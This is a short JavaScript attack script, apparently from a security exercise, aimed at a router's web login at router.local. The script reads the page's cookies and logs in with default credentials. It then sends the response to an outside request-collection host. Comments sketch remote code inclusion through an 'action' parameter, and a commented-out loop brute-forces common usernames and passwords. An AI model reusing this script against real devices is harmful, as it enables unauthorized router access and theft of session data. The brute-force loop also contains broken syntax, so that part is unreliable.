//figure out how to login more automatically (e.g. for loops with all usernames/passwords + sending requests with each of them

const http = new XMLHttpRequest();
http.open('POST', 'http://router.local/login.php', true);
//'http://router.local/home.php?action=view&'+cook -> what we http.responseURL if successful login
//http://router.local/view.php
const cook = document.cookie;
//http.open('POST', 'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&'+cook, true); -> how to run own php code (e.g. ls)
// http.open('POST', 'http://router.local/home.php?action=setup&'+cook, true);

http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

http.onload = function () {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://hookb.in/W1yMQRGygKSYplzz6Rzp', true);
                xhr.setRequestHeader('Content-type', 'application/json');
                xhr.send(JSON.stringify(http.response));

};

// http.send();
http.send(cook+"&username=admin&pin=admin&notRobot=on");



// const unames = ["admin","root","cisco"];
// const pwords = ["123456","admin","password","secured"];
// var breakCheck = false;
// for (u in unames) {
//   for (p in pwords) {
//     let http = new XMLHttpRequest();
//     var url = cook+"&username="u+"&pin="+p+"&notRobot=on";
//     http.open('POST', 'http://router.local/login.php', true);
//        http.onreadystatechange = function() {
//           if(http.readyState === XMLHttpRequest.DONE && http.status === 200) {
//             if (http.responseURL === 'http://router.local/home.php?action=view&'+cook) {
//               breakCheck = true;
//               break;
//             }
//           }
//        }
//     http.send(url)
//   }
//    if (breakCheck) break;
// }

